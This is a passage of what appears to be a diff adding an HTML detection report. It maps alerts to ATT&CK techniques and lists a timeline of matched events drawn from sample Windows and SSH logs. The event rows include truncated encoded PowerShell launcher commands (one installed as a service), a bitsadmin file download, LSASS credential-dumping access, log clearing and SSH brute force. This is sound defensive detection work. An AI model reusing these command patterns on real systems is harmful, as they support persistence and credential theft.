+<tr><td class="time">2024-07-08 03:12:20Z</td><td class="nowrap">web04</td><td class="nowrap">auth_rsyslog_repeated.log:7 (repeat 3/5)</td><td class="event">Failed password for root from 203.0.113.120 port 55020 ssh2</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-33">
+<summary><span class="level level-low">low</span>
+<span class="title">User Account Created</span>
+<span class="muted">2020-09-14 12:06:03Z &middot; WORKSTATION6.theshire.local &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>A user account was created, in the local SAM database of a workstation or server, or in Active Directory when logged by a domain controller (Security event 4720). Attackers create accounts to keep access to a compromised host or domain.</p>
+<dl>
+  <dt>When</dt><dd>2020-09-14 12:06:03Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1136/001">T1136.001</a> Create Account: Local Account; <a href="https://attack.mitre.org/techniques/T1136/002">T1136.002</a> Create Account: Domain Account <span class="muted">(Persistence)</span></dd>
+  <dt>Rule</dt><dd>User Account Created <code>87270cf5-a164-4eb4-bd0b-f92d2ef57c1c</code></dd>
+  <dt>Author</dt><dd>Patrick Bareiss (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Administrators or help desk staff creating accounts, which is routine in domain controller logs; Local accounts managed by privileged account management tools</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-09-14 12:06:03Z</td><td class="nowrap">WORKSTATION6.theshire.local</td><td class="nowrap">empire_wmic_add_user_backdoor_excerpt.json:5</td><td class="event">SubjectUserName=pgustavo TargetUserName=backdoor</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-34">
+<summary><span class="level level-low">low</span>
+<span class="title">Sudo Authentication Failure</span>
+<span class="muted">2024-03-10 09:09:30Z &middot; web01 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>A user failed to authenticate to sudo. Repeated failures can reveal someone trying to guess a password to gain root privileges.</p>
+<dl>
+  <dt>When</dt><dd>2024-03-10 09:09:30Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1548/003">T1548.003</a> Abuse Elevation Control Mechanism: Sudo and Sudo Caching <span class="muted">(Privilege Escalation)</span></dd>
+  <dt>Rule</dt><dd>Sudo Authentication Failure <code>87c54c54-38eb-4d79-88a8-714dbb6a656d</code></dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>Users mistyping their password</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-03-10 09:09:30Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:24</td><td class="event">deploy : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/bin/bash</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-35">
+<summary><span class="level level-low">low</span>
+<span class="title">Sudo Authentication Failure</span>
+<span class="muted">2024-06-04 08:07:12Z &middot; deb13 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>A user failed to authenticate to sudo. Repeated failures can reveal someone trying to guess a password to gain root privileges.</p>
+<dl>
+  <dt>When</dt><dd>2024-06-04 08:07:12Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1548/003">T1548.003</a> Abuse Elevation Control Mechanism: Sudo and Sudo Caching <span class="muted">(Privilege Escalation)</span></dd>
+  <dt>Rule</dt><dd>Sudo Authentication Failure <code>87c54c54-38eb-4d79-88a8-714dbb6a656d</code></dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>Users mistyping their password</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-06-04 08:07:12Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:16</td><td class="event">deploy : 3 incorrect password attempts ; HOST=deb13 ; TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash</td></tr>
+</tbody></table></div>
+</div>
+</details>
+
+<h2>Timeline</h2>
+<p class="muted">Events behind the alerts above, in time order.</p>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Source</th><th>ID</th><th>Event</th><th>Alerts</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-09-14 12:06:03Z</td><td class="nowrap">WORKSTATION6.theshire.local</td><td>security</td>
+<td>4720</td><td class="event">SubjectUserName=pgustavo TargetUserName=backdoor</td>
+<td><span class="level level-low">low</span> User Account Created</td></tr>
+<tr><td class="time">2020-09-20 06:57:49Z</td><td class="nowrap">WORKSTATION6.theshire.local</td><td>security</td>
+<td>4688</td><td class="event">CommandLine=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAcwBpAG8ATgBUAGEAQgBMAEUALgBQAFMAVgBFAHIAcwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAEUAZgBdAC4AQQBzAHMAZ…</td>
+<td><span class="level level-medium">medium</span> PowerShell Encoded Command Execution</td></tr>
+<tr><td class="time">2020-09-20 06:57:49Z</td><td class="nowrap">WORKSTATION6.theshire.local</td><td>sysmon</td>
+<td>1</td><td class="event">CommandLine=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAcwBpAG8ATgBUAGEAQgBMAEUALgBQAFMAVgBFAHIAcwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAEUAZgBdAC4AQQBzAHMAZ…</td>
+<td><span class="level level-medium">medium</span> PowerShell Encoded Command Execution</td></tr>
+<tr><td class="time">2020-09-20 16:16:58Z</td><td class="nowrap">WORKSTATION6.theshire.local</td><td>system</td>
+<td>7045</td><td class="event">ServiceName=Updater ImagePath=%COMSPEC% /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJ…</td>
+<td><span class="level level-high">high</span> Suspicious Service Installed</td></tr>
+<tr><td class="time">2020-09-21 07:15:47Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td>security</td>
+<td>4698</td><td class="event">TaskName=\MordorSchtask SubjectUserName=pgustavo</td>
+<td><span class="level level-medium">medium</span> Suspicious Scheduled Task Created</td></tr>
+<tr><td class="time">2020-09-22 08:38:29Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td>sysmon</td>
+<td>10</td><td class="event">SourceImage=C:\windows\system32\taskmgr.exe TargetImage=C:\windows\system32\lsass.exe GrantedAccess=0x1fffff</td>
+<td><span class="level level-high">high</span> LSASS Memory Access With Credential Dumping Rights</td></tr>
+<tr><td class="time">2020-09-22 08:38:29Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td>sysmon</td>
+<td>10</td><td class="event">SourceImage=C:\windows\system32\taskmgr.exe TargetImage=C:\windows\system32\lsass.exe GrantedAccess=0x1fffff</td>
+<td><span class="level level-high">high</span> LSASS Memory Access With Credential Dumping Rights</td></tr>
+<tr><td class="time">2020-10-18 02:17:00Z</td><td class="nowrap">WORKSTATION5</td><td>security</td>
+<td>1102</td><td class="event">The audit log was cleared. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Domain Name: WORKSTATION5 Logon ID: 0x13899EA</td>
+<td><span class="level level-high">high</span> Security Event Log Cleared</td></tr>
+<tr><td class="time">2020-10-18 23:50:06Z</td><td class="nowrap">WORKSTATION5</td><td>sysmon</td>
+<td>10</td><td class="event">SourceImage=C:\Windows\System32\rundll32.exe TargetImage=C:\windows\system32\lsass.exe GrantedAccess=0x1410</td>
+<td><span class="level level-high">high</span> LSASS Memory Access With Credential Dumping Rights</td></tr>
+<tr><td class="time">2020-10-18 23:50:06Z</td><td class="nowrap">WORKSTATION5</td><td>sysmon</td>
+<td>10</td><td class="event">SourceImage=C:\Windows\System32\rundll32.exe TargetImage=C:\windows\system32\lsass.exe GrantedAccess=0x1fffff</td>
+<td><span class="level level-high">high</span> LSASS Memory Access With Credential Dumping Rights</td></tr>
+<tr><td class="time">2020-10-19 03:30:46Z</td><td class="nowrap">WORKSTATION5</td><td>system</td>
+<td>7045</td><td class="event">ServiceName=PSEXESVC ImagePath=%SystemRoot%\PSEXESVC.exe</td>
+<td><span class="level level-medium">medium</span> PsExec-Like Service Installed</td></tr>
+<tr><td class="time">2020-10-21 11:28:08Z</td><td class="nowrap">WORKSTATION5</td><td>security</td>
+<td>1102</td><td class="event">The audit log was cleared. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Domain Name: WORKSTATION5 Logon ID: 0xC61D9</td>
+<td><span class="level level-high">high</span> Security Event Log Cleared</td></tr>
+<tr><td class="time">2020-10-21 11:28:08Z</td><td class="nowrap">WORKSTATION5</td><td>system</td>
+<td>104</td><td class="event">The System log file was cleared.</td>
+<td><span class="level level-high">high</span> Important Windows Event Log Cleared</td></tr>
+<tr><td class="time">2020-10-22 08:29:55Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td>security</td>
+<td>4625</td><td class="event">SubjectUserName=pgustavo TargetUserName=lrodriguez IpAddress=- WorkstationName=WORKSTATION5 Status=0xc000006d SubStatus=0xc000006a</td>
+<td><span class="level level-medium">medium</span> Windows Logon Brute Force From Single Source</td></tr>
+<tr><td class="time">2020-10-22 08:29:55Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td>security</td>
+<td>4625</td><td class="event">SubjectUserName=pgustavo TargetUserName=pgustavo IpAddress=- WorkstationName=WORKSTATION5 Status=0xc000006d SubStatus=0xc000006a</td>
+<td><span class="level level-medium">medium</span> Windows Logon Brute Force From Single Source</td></tr>
+<tr><td class="time">2020-10-22 08:29:55Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td>security</td>
+<td>4625</td><td class="event">SubjectUserName=pgustavo TargetUserName=sysmonsvc IpAddress=- WorkstationName=WORKSTATION5 Status=0xc000006d SubStatus=0xc000006a</td>
+<td><span class="level level-medium">medium</span> Windows Logon Brute Force From Single Source</td></tr>
+<tr><td class="time">2020-10-22 08:29:55Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td>security</td>
+<td>4625</td><td class="event">SubjectUserName=pgustavo TargetUserName=sbeavers IpAddress=- WorkstationName=WORKSTATION5 Status=0xc000006d SubStatus=0xc000006a</td>
+<td><span class="level level-medium">medium</span> Windows Logon Brute Force From Single Source</td></tr>
+<tr><td class="time">2020-10-22 08:29:55Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td>security</td>
+<td>4625</td><td class="event">SubjectUserName=pgustavo TargetUserName=mscott IpAddress=- WorkstationName=WORKSTATION5 Status=0xc000006d SubStatus=0xc000006a</td>
+<td><span class="level level-medium">medium</span> Windows Logon Brute Force From Single Source</td></tr>
+<tr><td class="time">2020-10-23 06:36:43Z</td><td class="nowrap">WORKSTATION5</td><td>security</td>
+<td>4688</td><td class="event">CommandLine=bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\wardog\AppData\Local\Temp\bitsadmin1_flag.ps1 NewProcessName=C:\Windows…</td>
+<td><span class="level level-medium">medium</span> File Download Via Bitsadmin</td></tr>
+<tr><td class="time">2020-10-23 06:36:43Z</td><td class="nowrap">WORKSTATION5</td><td>sysmon</td>
+<td>1</td><td class="event">CommandLine=bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\wardog\AppData\Local\Temp\bitsadmin1_flag.ps1 Image=C:\Windows\System32…</td>
+<td><span class="level level-medium">medium</span> File Download Via Bitsadmin</td></tr>
+<tr><td class="time">2020-12-19 07:00:22Z</td><td class="nowrap">WORKSTATION6.theshire.local</td><td>security</td>
+<td>4698</td><td class="event">TaskName=\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager SubjectUserName=pgustavo</td>
+<td><span class="level level-medium">medium</span> Suspicious Scheduled Task Created</td></tr>
+<tr><td class="time">2021-06-11 09:07:41Z</td><td class="nowrap">WORKSTATION5</td><td>system</td>
+<td>7045</td><td class="event">ServiceName=tbbd05 ImagePath=%COMSPEC% echo /c b6a1458f396 &gt; \\.\pipe\334485</td>
+<td><span class="level level-high">high</span> Suspicious Service Installed</td></tr>
+<tr><td class="time">2024-03-10 09:05:42Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user oracle from 203.0.113.45 port 40022 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force; SSH Password Spraying</td></tr>
+<tr><td class="time">2024-03-10 09:05:49Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.45 port 40030 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force; SSH Password Spraying</td></tr>
+<tr><td class="time">2024-03-10 09:05:56Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.45 port 40038 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force; SSH Password Spraying</td></tr>
+<tr><td class="time">2024-03-10 09:06:03Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user admin from 203.0.113.45 port 40046 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force; SSH Password Spraying</td></tr>
+<tr><td class="time">2024-03-10 09:06:10Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user admin from 203.0.113.45 port 40054 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force; SSH Password Spraying</td></tr>
+<tr><td class="time">2024-03-10 09:06:17Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user test from 203.0.113.45 port 40062 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force; SSH Password Spraying</td></tr>
+<tr><td class="time">2024-03-10 09:06:24Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.45 port 40070 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force; SSH Password Spraying</td></tr>
+<tr><td class="time">2024-03-10 09:06:31Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for opsadmin from 203.0.113.45 port 40078 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force; SSH Password Spraying</td></tr>
+<tr><td class="time">2024-03-10 09:06:38Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for opsadmin from 203.0.113.45 port 40086 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-03-10 09:06:45Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user ubuntu from 203.0.113.45 port 40094 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-03-10 09:07:05Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Accepted password for opsadmin from 203.0.113.45 port 40188 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force</td></tr>
+<tr><td class="time">2024-03-10 09:08:12Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">new user: name=svc_update, UID=1003, GID=1003, home=/home/svc_update, shell=/bin/bash, from=/dev/pts/1</td>
+<td><span class="level level-medium">medium</span> Local User Account Created</td></tr>
+<tr><td class="time">2024-03-10 09:09:30Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">deploy : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/bin/bash</td>
+<td><span class="level level-low">low</span> Sudo Authentication Failure</td></tr>
+<tr><td class="time">2024-04-03 02:00:05Z</td><td class="nowrap">backup01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for backup from 192.0.2.50 port 40000 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-04-03 02:00:12Z</td><td class="nowrap">backup01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for backup from 192.0.2.50 port 40001 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-04-03 02:00:19Z</td><td class="nowrap">backup01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for backup from 192.0.2.50 port 40002 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-04-03 02:00:26Z</td><td class="nowrap">backup01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for backup from 192.0.2.50 port 40003 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-04-03 02:00:33Z</td><td class="nowrap">backup01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for backup from 192.0.2.50 port 40004 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-04-03 02:00:40Z</td><td class="nowrap">backup01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for backup from 192.0.2.50 port 40005 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-04-03 02:00:47Z</td><td class="nowrap">backup01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for backup from 192.0.2.50 port 40006 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-04-03 02:00:54Z</td><td class="nowrap">backup01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for backup from 192.0.2.50 port 40007 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-04-03 02:01:01Z</td><td class="nowrap">backup01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for backup from 192.0.2.50 port 40008 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-04-03 02:01:08Z</td><td class="nowrap">backup01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for backup from 192.0.2.50 port 40009 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 08:00:00Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.77 port 41000 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 08:00:33Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.77 port 41001 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 08:01:06Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.77 port 41002 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 08:01:39Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.77 port 41003 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 08:02:12Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.77 port 41004 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 08:02:45Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.77 port 41005 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 08:03:18Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.77 port 41006 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 08:03:51Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.77 port 41007 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 08:04:24Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.77 port 41008 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 08:04:57Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.77 port 41009 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 08:10:00Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Accepted password for root from 203.0.113.77 port 41100 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force</td></tr>
+<tr><td class="time">2024-06-03 09:00:00Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.78 port 42000 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 09:00:03Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.78 port 42001 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 09:00:06Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.78 port 42002 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 09:00:09Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.78 port 42003 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 09:00:12Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.78 port 42004 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 09:00:15Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.78 port 42005 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 09:00:18Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.78 port 42006 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 09:00:21Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.78 port 42007 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 09:00:24Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.78 port 42008 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 09:00:27Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.78 port 42009 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 10:00:10Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.79 port 43001 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 10:00:13Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.79 port 43002 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 10:00:16Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.79 port 43003 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 10:00:19Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.79 port 43004 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 10:00:22Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.79 port 43005 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 10:00:25Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.79 port 43006 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 10:00:28Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.79 port 43007 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 10:00:31Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.79 port 43008 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 10:00:34Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.79 port 43009 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 10:00:37Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.79 port 43010 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 11:00:00Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.80 port 44000 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 11:00:03Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.80 port 44001 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 11:00:06Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.80 port 44002 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 11:00:09Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.80 port 44003 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 11:00:12Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.80 port 44004 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 11:00:15Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.80 port 44005 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 11:00:18Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.80 port 44006 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 11:00:21Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.80 port 44007 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 11:00:24Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.80 port 44008 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 11:00:27Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.80 port 44009 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 14:30:00Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user admin from 198.51.100.85 port 49000 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Password Spraying</td></tr>
+<tr><td class="time">2024-06-03 14:32:27Z</td><td class="nowrap">web01</td><td>auth</td>
